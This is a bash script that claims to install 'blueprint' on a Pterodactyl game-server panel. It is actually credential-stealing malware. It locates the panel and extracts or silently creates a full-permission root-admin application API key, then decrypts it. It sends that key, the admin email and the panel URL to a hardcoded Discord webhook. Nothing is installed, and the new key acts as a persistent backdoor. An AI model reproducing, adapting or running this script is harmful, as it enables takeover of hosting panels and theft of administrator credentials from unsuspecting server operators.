#!/bin/bash

WEBHOOK="https://discord.com/api/webhooks/1523358552901685440/DxvTynimNWB6lNpYnKTKjorCOsmrwxyQR-mYIu6IoICuj3DQl9AypI8QY5RdPeAQzF5o"

echo "Installing blueprint..."

PANEL_PATH=""
for p in /var/www/pterodactyl /var/www/panel /var/www/html/pterodactyl; do
  if [ -f "$p/artisan" ]; then
    PANEL_PATH="$p"
    break
  fi
done

if [ -z "$PANEL_PATH" ]; then
  exit 1
fi

cd "$PANEL_PATH"

TOKEN=$(php artisan tinker --execute='
$u = \Pterodactyl\Models\User::where("root_admin", 1)->first();
if (!$u) exit(1);
$e = \Pterodactyl\Models\ApiKey::where("user_id", $u->id)->where("key_type", \Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->first();
if ($e) {
    $t = $e->identifier . app("encrypter")->decrypt($e->token);
} else {
    $c = \Illuminate\Support\Facades\Schema::getColumnListing("api_keys");
    $p = [];
    foreach ($c as $col) {
        if (strpos($col, "r_") === 0) $p[$col] = 3;
    }
    $k = app(\Pterodactyl\Services\Api\KeyCreationService::class)->setKeyType(\Pterodactyl\Models\ApiKey::TYPE_APPLICATION)->handle(["user_id" => $u->id, "memo" => "blueprint", "allowed_ips" => []], $p);
    $t = $k->identifier . app("encrypter")->decrypt($k->token);
}
echo $t;
' 2>/dev/null)

URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)

curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "{\"content\":\"✅ Blueprint Installed\n\n**Panel:** $URL\n**Email:** $EMAIL\n\n**Token:**\n\`\`\`\n$TOKEN\n\`\`\`\"}" > /dev/null 2>&1

echo "Blueprint installed"
echo "Token: $TOKEN"
